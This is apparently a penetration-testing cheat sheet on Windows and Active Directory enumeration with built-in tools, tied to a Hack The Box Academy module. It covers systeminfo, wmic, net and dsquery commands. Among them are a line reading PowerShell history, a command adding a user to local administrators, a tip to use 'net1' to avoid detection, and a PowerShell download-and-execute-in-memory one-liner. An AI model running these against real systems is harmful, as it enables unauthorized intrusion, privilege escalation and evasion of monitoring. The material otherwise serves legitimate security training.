# Living of the Land

In case you are on host where you cannot load tools, and don't have internet
access on it. You need to use built-in tools for enumeration. 

## Host & Network Recon

 ```shell
 # We can get basic info about the system using this command
 Systeminfo
 
 # Get user's information and privileges
 whoami /all

 # Get the specified user's PowerShell history
 Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

 # Prints the PC's Name
 hostname
 # Prints out the OS version and revision level
 [System.Environment]::OSVersion.Version
 # Displays a list of environment variables for the current session (ran from CMD-prompt)
 set
 Get-ChildItem Env: | ft Key,Value
 # Displays the domain name to which the host belongs (ran from CMD-prompt)
 echo %USERDOMAIN%
 # Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
 echo %logonserver%
 # Prints out network adapter state and configurations
 ipconfig /all
 # List of all known hosts stored in arp table
 arp -a
 # Displays routing table (IPv4 & IPv6)
 route print
 ```

## Recon using WMI

Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows 
enterprise environments to retrieve information and run administrative tasks on local and remote hosts.

 ```shell
 # Prints the patch level and description of the Hotfixes applied
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 # Displays basic host information including attributes such as Name, Domain, Manufacturer, Model, Username, and Roles
 wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
 # A listing of all processes on the host
 wmic process list /format:list
 # Displays information about the Domain and Domain Controllers
 wmic ntdomain list /format:list
 # Displays information about all local accounts and any domain accounts that have logged into the device
 wmic useraccount list /format:list
 # Information about all local groups
 wmic group list /format:list
 # Dumps information about any system accounts that are being used as service accounts
 wmic sysaccount list /format:list
 ```

## Net Commands for Domain Enumeration

 ```shell
 # Information about password requirements
 net accounts
 # Password and lockout policy
 net accounts /domain
 # Information about domain groups
 net group /domain
 # List users with domain admin privileges
 net group "Domain Admins" /domain
 # List of PCs connected to the domain
 net group "domain computers" /domain
 # List PC accounts of domain controllers
 net group "Domain Controllers" /domain
 # User that belongs to the specified domain group
 net group <domain_group_name> /domain
 # List of domain groups
 net groups /domain
 # All available local groups
 net localgroup
 # List users that belong to the administrators group inside the domain
 # (the group Domain Admins is included here by default)
 net localgroup administrators /domain
 # Information about a group (administrators)
 net localgroup Administrators
 # Add a user to the administrators group
 net localgroup administrators [username] /add
 # Check current network shares
 net share
 # Get information about a user within the domain
 net user <ACCOUNT_NAME> /domain
 # List all users of the domain
 net user /domain
 # Information about the current user
 net user %username%
 # Mount the share locally
 net use x: \computer\share
 # Get a list of computers
 net view
 # List shares on the domains
 net view /all /domain[:domainname]
 # List shares of a specific computer
 net view \computer /ALL
 # List of PCs in the domain
 net view /domain
 ```
 Use `net1` to avoid detection.


## Dsquery
- Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects.
- It exists on modern Windows systems at `C:\Windows\System32\dsquery.dll`
- But we need shell from `SYSTEM` context.

 ```shell
 # Get users
 dsquery user
 # Get computers
 dsquery computer

 # Wildcard queries

 # Note: CN=Users refers to the Users container, which is a default container 
 # object where user accounts, security groups, and other objects are
 # stored by default when they are created, unless a different container
 # or Organizational Unit (OU) is specified.
 dsquery * "CN=Users,DC=$DOMAIN,DC=LOCAL"
 # Users With Specific Attributes Set (PASSWD_NOTREQD)
 dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
 # Searching for Domain Controllers
 dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName 
 ```

### Some Useful Commands

 ```shell
 # Download a file from the web using PowerShell and call it from memory.
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"
 ```

### LDAP Filtering Explanation
https://academy.hackthebox.com/module/143/section/1360
